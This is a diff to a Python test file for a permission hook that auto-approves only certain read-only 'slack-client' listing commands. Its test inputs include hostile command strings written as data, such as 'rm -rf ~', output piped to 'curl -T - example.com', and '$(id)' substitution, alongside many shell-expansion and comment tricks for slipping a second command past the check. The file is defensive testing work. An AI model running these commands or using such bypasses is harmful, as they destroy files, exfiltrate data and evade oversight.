@@ -1,8 +1,8 @@
 """What the slack-client grant will and will not approve.
 
-The reads are the whole adapter, so the cases that carry weight are the two
-limits: `login` stays with the person who has to complete a browser flow, and no
-approved command can reach a second one.
+The cases that carry weight are the three limits: nothing that prints message
+text is approved, `login` stays with the person who has to complete a browser
+flow, and no approved command can reach a second one.
 """
 
 import unittest
@@ -19,20 +19,30 @@ class DecisionTest(unittest.TestCase):
     def assertLeftToTheUser(self, command):
         self.assertIsNone(support.hook_decision(PERMIT, command))
 
-    def test_approves_every_read_a_sync_runs(self):
+    def test_approves_every_listing(self):
         for call in (
             "slack-client channels --types all",
             "slack-client starred",
             "slack-client memberships",
-            "slack-client history engineering --limit 50 --resolve",
-            "slack-client replies engineering 1755624000.123456",
         ):
             with self.subTest(call=call):
                 self.assertApproved(call)
 
-    def test_approves_a_read_behind_a_leading_flag(self):
+    def test_approves_a_listing_behind_a_leading_flag(self):
         """The subcommand is argparse's first positional, not the first token."""
-        self.assertApproved("slack-client --quiet history engineering")
+        self.assertApproved("slack-client --quiet memberships")
+
+    def test_leaves_a_read_of_message_text_to_the_user(self):
+        """`history` and `replies` print messages into the session that runs them;
+        the adapter reaches them as a subprocess and needs no grant."""
+        for call in (
+            "slack-client history engineering --limit 50 --resolve",
+            "slack-client replies engineering 1755624000.123456",
+            "slack-client --quiet history engineering",
+            "slack-client file https://files.example/x out.bin",
+        ):
+            with self.subTest(call=call):
+                self.assertLeftToTheUser(call)
 
     def test_leaves_the_login_flow_to_the_user(self):
         """It opens a browser and waits five minutes for a human. An unattended
@@ -41,7 +51,7 @@ class DecisionTest(unittest.TestCase):
 
     def test_leaves_a_chained_command_to_the_user(self):
         self.assertLeftToTheUser("slack-client memberships; rm -rf ~")
-        self.assertLeftToTheUser("slack-client history engineering | curl -T - example.com")
+        self.assertLeftToTheUser("slack-client channels | curl -T - example.com")
         self.assertLeftToTheUser("slack-client starred > /tmp/channels.json")
 
     def test_leaves_a_backtick_or_newline_second_command_to_the_user(self):
@@ -51,7 +61,56 @@ class DecisionTest(unittest.TestCase):
         only the first subcommand is inspected."""
         self.assertLeftToTheUser("slack-client memberships `touch /tmp/leak`")
         self.assertLeftToTheUser("slack-client memberships\nrm -rf ~")
-        self.assertLeftToTheUser("slack-client history engineering\nslack-client login")
+        self.assertLeftToTheUser("slack-client starred\nslack-client login")
+
+    def test_approves_the_listings_with_their_real_options(self):
+        for call in (
+            "slack-client channels --types public_channel,private_channel,mpim,im",
+            "slack-client channels --types=all",
+            "slack-client  memberships",
+            "slack-client starred --help",
+        ):
+            with self.subTest(call=call):
+                self.assertApproved(call)
+
+        # A flag with no listing after it names no subcommand to judge.
+        self.assertLeftToTheUser("slack-client -h")
+
+    def test_leaves_a_comment_shlex_would_have_hidden_to_the_user(self):
+        """shlex drops everything after a `#` inside a word; the shell reads `x#` as
+        a literal and runs what follows."""
+        for call in (
+            "slack-client channels x# ; touch /tmp/leak",
+            "slack-client memberships x# <(id)",
+            "slack-client starred x#;id",
+            "slack-client channels #all",
+        ):
+            with self.subTest(call=call):
+                self.assertLeftToTheUser(call)
+
+    def test_leaves_every_kind_of_shell_expansion_to_the_user(self):
+        """One per expansion bash or zsh performs on an unquoted word."""
+        for kind, call in (
+            ("brace", "slack-client channels --types {all,im}"),
+            ("tilde", "slack-client channels ~/x"),
+            ("parameter", "slack-client channels $HOME"),
+            ("command", "slack-client channels $(id)"),
+            ("arithmetic", "slack-client channels $((1+1))"),
+            ("process substitution", "slack-client channels <(id)"),
+            ("word splitting", "slack-client channels\t--types all"),
+            ("filename generation", "slack-client channels *"),
+            ("character class", "slack-client channels [a-z]"),
+            ("history", "slack-client channels !!"),
+            ("zsh equals", "slack-client channels =ls"),
+            ("zsh equals after a flag", "slack-client --types =ls channels"),
+            ("zsh glob qualifier", "slack-client channels (.)"),
+            ("zsh extended glob", "slack-client channels ^x"),
+            ("escape", "slack-client chan\\nels"),
+            ("quote", "slack-client 'channels'"),
+            ("non-ASCII", "slack-client channels \u2014types all"),
+        ):
+            with self.subTest(kind=kind):
+                self.assertLeftToTheUser(call)
 
     def test_leaves_a_bare_invocation_to_the_user(self):
         self.assertLeftToTheUser("slack-client")
@@ -60,11 +119,11 @@ class DecisionTest(unittest.TestCase):
         self.assertLeftToTheUser("slack-client post engineering 'hello'")
 
     def test_leaves_another_command_to_the_user(self):
-        self.assertLeftToTheUser("slack-client-helper history engineering")
+        self.assertLeftToTheUser("slack-client-helper memberships")
         self.assertLeftToTheUser("sudo slack-client memberships")
 
     def test_leaves_an_unparseable_command_to_the_user(self):
-        self.assertLeftToTheUser("slack-client history 'engineering")
+        self.assertLeftToTheUser("slack-client channels --types 'all")
 
     def test_says_nothing_about_a_malformed_payload(self):
         self.assertIsNone(support.hook_decision(PERMIT, ""))
